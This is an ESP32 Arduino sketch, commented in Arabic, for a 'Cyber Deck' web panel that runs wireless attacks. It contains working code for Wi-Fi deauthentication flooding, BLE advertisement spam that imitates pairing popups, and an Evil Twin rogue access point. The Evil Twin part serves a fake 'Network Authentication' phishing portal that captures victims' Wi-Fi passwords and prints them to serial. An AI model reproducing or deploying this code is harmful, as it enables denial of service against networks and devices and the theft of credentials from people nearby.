#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include "esp_wifi.h"
#include "esp_bt.h"
#include "esp_gap_ble_api.h"
#include "esp_bt_main.h"
#include "freertos/queue.h"

const char* ap_ssid = "ESP32_Cyber_Deck";
const char* ap_password = "password123";

WebServer server(80);
DNSServer dnsServer;
const byte DNS_PORT = 53;

// متغيرات Evil Twin / Rogue AP
String targetSSID = "";
bool isEvilTwinActive = false;
String capturedPassword = "";

// متغيرات BLE Spam والمسح
bool isBleSpamActive = false;
unsigned long lastBleSpamTime = 0;

// متغيرات آمنة لنتائج البلوتوث عبر FreeRTOS Queue
struct BleResult {
  char mac[18];
  int rssi;
};
QueueHandle_t bleQueue;
String bleScanResults = "";
bool isScanningBLE = false;
bool bleScanActive = false;
unsigned long bleScanEndTime = 0;

// واجهة المستخدم الرسومية المحدثة مع خيار BLE Spam
const char html_page[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ESP32 Cyber Deck Pro</title>
  <style>
    body { background-color: #0d1117; color: #58a6ff; font-family: monospace; text-align: center; margin: 0; padding: 15px; }
    h1 { color: #f85149; font-size: 22px; margin-bottom: 5px; }
    p { color: #8b949e; font-size: 13px; }
    .btn { background: #21262d; color: #58a6ff; border: 1px solid #30363d; padding: 12px 20px; margin: 8px; font-size: 14px; cursor: pointer; border-radius: 6px; display: block; width: 90%; max-width: 320px; margin-left: auto; margin-right: auto; }
    .btn:active { background: #30363d; }
    .danger { color: #f85149; border-color: #f85149; }
    input { background: #161b22; color: #7ee787; border: 1px solid #30363d; padding: 10px; width: 80%; max-width: 300px; margin: 5px; border-radius: 4px; font-family: monospace; }
    #log { background: #161b22; border: 1px solid #30363d; padding: 12px; margin-top: 15px; text-align: left; height: 180px; overflow-y: scroll; font-size: 11px; color: #7ee787; border-radius: 6px; word-break: break-all; }
  </style>
</head>
<body>
  <h1>ESP32 Cyber Deck Pro</h1>
  <p>منصة السيطرة المتقدمة (Rogue AP & BLE Spam)</p>
  
  <button class="btn" onclick="sendCommand('scan_wifi')">🔍 فحص شبكات الواي فاي</button>
  <button class="btn danger" onclick="sendCommand('deauth')">⚡ إرسال حزم Deauth</button>
  <button class="btn" onclick="sendCommand('scan_ble')">🔵 فحص أجهزة البلوتوث (BLE)</button>
  <button class="btn danger" onclick="sendCommand('toggle_blespam')">📡 تبديل وضع إزعاج البلوتوث (BLE Spam)</button>
  
  <div style="background: #161b22; padding: 10px; border-radius: 6px; margin-top: 10px; border: 1px solid #30363d;">
    <p><b>هجوم Evil Twin (انتحال شبكة):</b></p>
    <input type="text" id="target_ssid" placeholder="اسم الشبكة المستهدفة (SSID)"><br>
    <button class="btn danger" onclick="startEvilTwin()">🏴‍☠️ إطلاق نقطة الوصول المزيفة</button>
  </div>

  <h3>السجل المباشر (Logs):</h3>
  <div id="log">System Ready...</div>

  <script>
    function sendCommand(cmd) {
      let logBox = document.getElementById('log');
      logBox.insertAdjacentHTML('beforeend', '<br><span style="color:#f0883e;">[+] Executing: ' + cmd + '...</span>');
      logBox.scrollTop = logBox.scrollHeight;
      
      fetch('/' + cmd)
        .then(response => response.text())
        .then(data => {
          logBox.insertAdjacentHTML('beforeend', '<br>' + data);
          logBox.scrollTop = logBox.scrollHeight;
        }).catch(err => {
          logBox.insertAdjacentHTML('beforeend', '<br><span style="color:red;">Error connecting to device</span>');
        });
    }

    function startEvilTwin() {
      let ssid = document.getElementById('target_ssid').value;
      if(!ssid) { alert('الرجاء إدخال اسم الشبكة'); return; }
      let logBox = document.getElementById('log');
      logBox.insertAdjacentHTML('beforeend', '<br><span style="color:#f85149;">[!] Launching Evil Twin for: ' + ssid + '...</span>');
      
      fetch('/start_eviltwin?ssid=' + encodeURIComponent(ssid))
        .then(response => response.text())
        .then(data => {
          logBox.insertAdjacentHTML('beforeend', '<br>' + data);
          logBox.scrollTop = logBox.scrollHeight;
        });
    }
  </script>
</body>
</html>
)rawliteral";

// صفحة التصيد الوهمية (Captive Portal)
const char captive_page[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>System Authentication Required</title>
  <style>
    body { background-color: #121212; color: #ffffff; font-family: sans-serif; text-align: center; padding: 30px; }
    .box { background: #1e1e1e; padding: 25px; border-radius: 8px; max-width: 400px; margin: auto; border: 1px solid #333; }
    input { width: 90%; padding: 12px; margin: 10px 0; background: #2d2d2d; border: 1px solid #444; color: #fff; border-radius: 4px; }
    .btn { background: #007acc; color: white; border: none; padding: 12px; width: 95%; border-radius: 4px; cursor: pointer; font-weight: bold; }
  </style>
</head>
<body>
  <div class="box">
    <h2>Network Authentication</h2>
    <p>يتطلب تحديث النظام أو المصادقة إدخال كلمة مرور الشبكة للمتابعة.</p>
    <form action="/capture" method="POST">
      <input type="password" name="wifi_pass" placeholder="أدخل كلمة مرور الواي فاي" required><br>
      <button class="btn" type="submit">اتصال وتثبيت التحديث</button>
    </form>
  </div>
</body>
</html>
)rawliteral";

// HTML Escaping للحماية من الثغرات
String escapeHtml(const String& input) {
  String out;
  out.reserve(input.length());
  for (char c : input) {
    switch (c) {
      case '&':  out += "&amp;";  break;
      case '<':  out += "&lt;";   break;
      case '>':  out += "&gt;";   break;
      case '"':  out += "&quot;"; break;
      case '\'': out += "&#39;";  break;
      default:   out += c;        break;
    }
  }
  return out;
}

// دالة إرسال إعلانات بلوتوث مزعجة (BLE Spam / Advertisement Attack)
void sendBleSpamPacket() {
  uint8_t raw_advertisement_data[] = {
    0x02, 0x01, 0x06,                                // Flags
    0x03, 0x03, 0x2C, 0xFE,                          // Apple/Android pairing frame header snippet
    0x0F, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x02,  // Payload payload bytes simulating rapid pairing popups
    0x7F, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
  };

  esp_ble_adv_data_t adv_data = {
    .set_scan_rsp = false,
    .include_name = false,
    .include_txpower = false,
    .min_interval = 0x0006,
    .max_interval = 0x0010,
    .appearance = 0x00,
    .manufacturer_len = sizeof(raw_advertisement_data),
    .p_manufacturer_data = raw_advertisement_data,
    .service_data_len = 0,
    .p_service_data = NULL,
    .service_uuid_len = 0,
    .p_service_uuid = NULL,
    .flag = (ESP_BLE_ADV_FLAG_GEN_DISC | ESP_BLE_ADV_FLAG_BREDR_NOT_SPT)
  };

  esp_ble_adv_params_t adv_params = {
    .adv_int_min        = 0x20,
    .adv_int_max        = 0x40,
    .adv_type           = ADV_TYPE_IND,
    .own_addr_type      = BLE_ADDR_TYPE_PUBLIC,
    .peer_addr          = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    .peer_addr_type     = BLE_ADDR_TYPE_PUBLIC,
    .channel_map        = ADV_CHNL_ALL,
    .adv_filter_policy  = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
  };

  esp_ble_gap_start_advertising(&adv_params);
  delay(50);
  esp_ble_gap_stop_advertising();
}

// دالة بلوتوث آمنة باستخدام FreeRTOS Queue
void ble_gap_cb(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t *param) {
  if (event == ESP_GAP_BLE_SCAN_RESULT_EVT) {
    esp_ble_gap_cb_param_t *scan_result = (esp_ble_gap_cb_param_t *)param;
    if (scan_result->scan_rst.search_evt == ESP_GAP_SEARCH_INQ_RES_EVT && isScanningBLE) {
      BleResult item;
      snprintf(item.mac, sizeof(item.mac), "%02x:%02x:%02x:%02x:%02x:%02x",
              scan_result->scan_rst.bda[0], scan_result->scan_rst.bda[1], scan_result->scan_rst.bda[2],
              scan_result->scan_rst.bda[3], scan_result->scan_rst.bda[4], scan_result->scan_rst.bda[5]);
      item.rssi = scan_result->scan_rst.rssi;
      xQueueSend(bleQueue, &item, 0);
    }
  }
}

// دالة إرسال حزم Deauth
void sendDeauthPacket() {
  uint8_t packet[26] = {
    0xc0, 0x00, 0x3a, 0x01, 
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
    0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 
    0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 
    0x00, 0x00, 
    0x07, 0x00                          
  };

  esp_wifi_set_promiscuous(true);
  for (int ch = 1; ch <= 13; ch++) {
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    for (int i = 0; i < 3; i++) {
      esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
      delay(1);
    }
  }
  esp_wifi_set_promiscuous(false);
}

void setup() {
  Serial.begin(115200);
  bleQueue = xQueueCreate(20, sizeof(BleResult));

  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(ap_ssid, ap_password);
  
  btStart();
  esp_bluedroid_init();
  esp_bluedroid_enable();
  esp_ble_gap_register_callback(ble_gap_cb);

  esp_ble_scan_params_t ble_scan_params = {
    .scan_type              = BLE_SCAN_TYPE_ACTIVE,
    .scan_addr_type         = BLE_ADDR_TYPE_PUBLIC,
    .scan_filter_policy     = BLE_SCAN_FILTER_ALLOW_ALL,
    .scan_interval          = 0x50,
    .scan_window            = 0x30,
    .scan_duplicate         = BLE_SCAN_DUPLICATE_DISABLE
  };
  esp_ble_gap_set_scan_params(&ble_scan_params);

  server.on("/", []() {
    if (isEvilTwinActive) {
      server.send_P(200, "text/html", captive_page);
    } else {
      server.send_P(200, "text/html", html_page);
    }
  });

  server.on("/capture", HTTP_POST, []() {
    if (server.hasArg("wifi_pass")) {
      capturedPassword = server.arg("wifi_pass");
      server.send(200, "text/html", "<h2>تم بنجاح! جاري التحديث...</h2>");
      Serial.println("[!] Captured Password: " + capturedPassword);
    } else {
      server.send(400, "text/plain", "Bad Request");
    }
  });

  server.on("/scan_wifi", []() {
    int16_t n = WiFi.scanNetworks();
    String result = "<b>[+] Wi-Fi Found (" + String(n) + "):</b><br>";
    if (n < 0) {
      result += "Scan failed or running.<br>";
    } else {
      for (int i = 0; i < n; ++i) {
        result += "&bull; " + escapeHtml(WiFi.SSID(i)) + " (Ch:" + String(WiFi.channel(i)) + ", RSSI:" + String(WiFi.RSSI(i)) + ")<br>";
      }
    }
    server.send(200, "text/html", result);
  });

  server.on("/deauth", []() {
    sendDeauthPacket();
    server.send(200, "text/html", "<span style='color:#f85149;'><b>[!] Deauth frames injected successfully!</b></span>");
  });

  server.on("/scan_ble", []() {
    bleScanResults = "<b>[+] BLE Devices Found:</b><br>";
    isScanningBLE = true;
    esp_ble_gap_start_scanning(3);
    bleScanActive = true;
    bleScanEndTime = millis() + 3200;
    server.send(200, "text/html", "BLE scan started, check logs shortly...");
  });

  server.on("/toggle_blespam", []() {
    isBleSpamActive = !isBleSpamActive;
    if (isBleSpamActive) {
      server.send(200, "text/html", "<span style='color:#f85149;'><b>[!] BLE Spam Started!</b></span>");
    } else {
      server.send(200, "text/html", "<span style='color:#7ee787;'><b>[+] BLE Spam Stopped.</b></span>");
    }
  });

  server.on("/start_eviltwin", []() {
    if (server.hasArg("ssid")) {
      targetSSID = server.arg("ssid");
      WiFi.softAP(targetSSID.c_str());
      dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
      isEvilTwinActive = true;
      server.send(200, "text/html", "<span style='color:#f85149;'><b>[!] Evil Twin AP active for: " + escapeHtml(targetSSID) + "</b></span>");
    } else {
      server.send(400, "text/plain", "Missing SSID");
    }
  });

  server.on("/ble_results", []() {
    server.send(200, "text/html", bleScanResults);
  });

  server.begin();
}

void loop() {
  server.handleClient();
  if (isEvilTwinActive) {
    dnsServer.processNextRequest();
  }

  // تشغيل هجوم إزعاج البلوتوث بشكل مستمر في الخلفية دون تجميد النظام
  if (isBleSpamActive) {
    if (millis() - lastBleSpamTime > 100) {
      sendBleSpamPacket();
      lastBleSpamTime = millis();
    }
  }

  BleResult item;
  while (xQueueReceive(bleQueue, &item, 0) == pdTRUE) {
    if (bleScanResults.length() < 3000) {
      bleScanResults += "&bull; BLE: " + String(item.mac) + " | RSSI: " + String(item.rssi) + "<br>";
    }
  }

  if (bleScanActive && millis() >= bleScanEndTime) {
    esp_ble_gap_stop_scanning();
    isScanningBLE = false;
    bleScanActive = false;
  }
  
  if (capturedPassword != "") {
    Serial.println("[SUCCESS] Captured Password for " + targetSSID + " : " + capturedPassword);
    capturedPassword = ""; 
  }
}
